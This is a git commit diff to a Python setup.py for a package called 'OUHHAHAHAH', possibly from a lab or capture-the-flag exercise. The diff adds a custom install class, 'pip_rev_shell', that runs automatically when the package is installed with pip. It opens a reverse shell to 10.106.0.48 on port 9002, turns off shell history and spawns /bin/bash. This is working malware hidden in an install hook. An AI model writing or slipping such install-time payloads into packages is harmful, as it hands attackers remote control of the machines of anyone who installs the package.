6944d0f9d65fb497ec395a83f8603e6250366d47
SNicolas974 <nicolas.samy@epitech.eu>
2024-04-10 18:37:27 +0400

    year

--- setup.py
+++ setup.py
@@ -4,17 +4,16 @@ import base64
 import os
 
 
-class CustomInstall(install):
+class pip_rev_shell(install):
     def run(self):
         install.run(self)
         LHOST = '10.106.0.48'
         LPORT = 9002
-
         reverse_shell = 'python -c "import os; import pty; import socket; s = socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.connect((\'{LHOST}\', {LPORT})); os.dup2(s.fileno(), 0); os.dup2(s.fileno(), 1); os.dup2(s.fileno(), 2); os.putenv(\'HISTFILE\', \'/dev/null\'); pty.spawn(\'/bin/bash\'); s.close();"'.format(LHOST=LHOST,LPORT=LPORT)
-        os.system('echo %s|bash' % reverse_shell)
+        os.system(reverse_shell)
 
 
 setup(
     name='OUHHAHAHAH',
-    cmdclass={'install': CustomInstall}
+    cmdclass={'install': pip_rev_shell}
 )
